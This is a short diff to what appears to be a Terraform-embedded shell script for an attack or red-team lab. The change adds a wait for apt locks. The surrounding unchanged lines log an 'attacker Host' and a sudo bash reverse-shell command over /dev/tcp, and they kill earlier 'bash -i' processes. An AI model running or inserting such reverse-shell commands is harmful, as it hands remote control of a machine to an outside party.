@@ -14,6 +14,13 @@ locals {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
     }
     truncate -s 0 $LOGFILE
+    check_apt() {
+        pgrep -f "apt" || pgrep -f "dpkg"
+    }
+    while check_apt; do
+        log "Waiting for apt to be available..."
+        sleep 10
+    done
     log "attacker Host: ${local.host_ip}:${local.host_port}"
     kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
     log "running: sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
